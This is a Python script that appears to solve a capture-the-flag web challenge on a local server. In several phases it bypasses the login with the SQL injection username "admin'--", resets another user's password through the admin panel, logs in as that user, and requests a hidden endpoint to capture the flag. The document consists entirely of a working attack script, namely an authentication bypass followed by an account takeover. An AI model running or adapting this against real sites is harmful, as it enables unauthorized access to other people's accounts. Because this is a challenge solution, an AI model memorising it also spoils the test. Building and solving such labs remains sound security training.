import requests
import time

URL = "http://localhost:30005"
session = requests.Session()

print("[*] Connecting to server at " + URL + "...")
res = session.get(URL)
print("[+] Server responded with HTTP", res.status_code)

print("\n--- PHASE 1: SQL INJECTION (LOGIN BYPASS) ---")
# Using the exact payload: admin'--
payload = {
    "username": "admin'--",
    "password": "doesnt_matter"
}
print(f"[*] Attempting SQLi with username: {payload['username']}")
res = session.post(f"{URL}/index.php", data=payload)

if "Command Center Overview" in res.text:
    print("[+] SQL Injection SUCCESS! Logged in as Admin.")
else:
    print("[-] SQL Injection FAILED.")
    exit(1)

print("\n--- PHASE 2: CHANGING LOWER PRIVILEGED USER PASSWORD ---")
print("[*] Accessing Account Management and changing Kurapika's password to 'hacked123'...")
change_payload = {
    "target_user": "Kurapika",
    "new_password": "hacked123",
    "change_password": "1"
}
res2 = session.post(f"{URL}/dashboard.php?page=edit_account&target=Kurapika", data=change_payload)
if "re-keyed for operative: Kurapika" in res2.text:
    print("[+] Password changed successfully for Kurapika!")
else:
    print("[-] Failed to change password.")
    exit(1)

print("\n--- PHASE 3: LOGGING OUT AND ACCESSING THE ACCOUNT ---")
session.get(f"{URL}/logout.php")
print("[*] Logged out of Admin.")

login_payload = {
    "username": "Kurapika",
    "password": "hacked123"
}
print("[*] Logging in as Kurapika with new password...")
res3 = session.post(f"{URL}/index.php", data=login_payload)

if "Kurapika" in res3.text and ("INFILTRATOR" in res3.text or "Kurta" in res3.text):
    print("[+] Successfully logged into Kurapika's profile!")
else:
    print("[-] Failed to login as Kurapika.")
    exit(1)

print("\n--- PHASE 4: RECOVERING FLAG VIA HIDDEN REQUEST ---")
print("[*] Simulating network request capture for 'temp_flag_check.php'...")
flag_res = session.post(f"{URL}/temp_flag_check.php", data={"action": "extract_memory"})

if "SSP{" in flag_res.text:
    print(f"\n[!!!] FLAG CAPTURED: {flag_res.text.strip()}")
    print("[+] Challenge solved successfully!")
else:
    print("[-] Failed to retrieve flag.")
    exit(1)
